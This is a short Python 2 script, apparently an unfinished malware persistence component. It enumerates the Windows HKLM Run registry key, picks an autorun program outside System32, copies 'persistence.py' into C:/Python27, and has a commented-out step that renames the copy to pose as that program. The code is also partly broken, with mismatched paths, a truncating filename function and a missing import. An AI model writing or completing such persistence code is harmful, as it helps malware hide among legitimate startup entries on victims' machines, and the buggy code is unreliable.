from _winreg import *
import shutil
def isSystemProtected(str):
	if "System32" in str:
		return True
	return False

def getFileName(str):
	i = len(str)-1
	while i >= 0:
	
		if (str[i] == "\\"):
			print"\n\nAHORA\n\n"
			break
		i-=1
	i+=1
	new_string = str[i:len(str)-1]
	print( "======>" + new_string)
	return new_string
aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)

aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run") 
lista = []
for i in range(1024):                                           
    try:
        n,v,t = EnumValue(aKey,i)
        lista.append(v)
        print n, v
		
    except EnvironmentError:
        break          
CloseKey(aKey)


persistence_path = "Nowhere"
for i in range(len(lista)): 
	if(isSystemProtected(lista[len(lista)-1-i]) == False):
		persistence_path = lista[len(lista)-1-i]

persistence_name = getFileName(persistence_path)

print "Setting persistence in " + persistence_path
shutil.copy("persistence.py","C:/Python27")
#os.rename("C:/Python27/include/persistence.py",persistence_name)
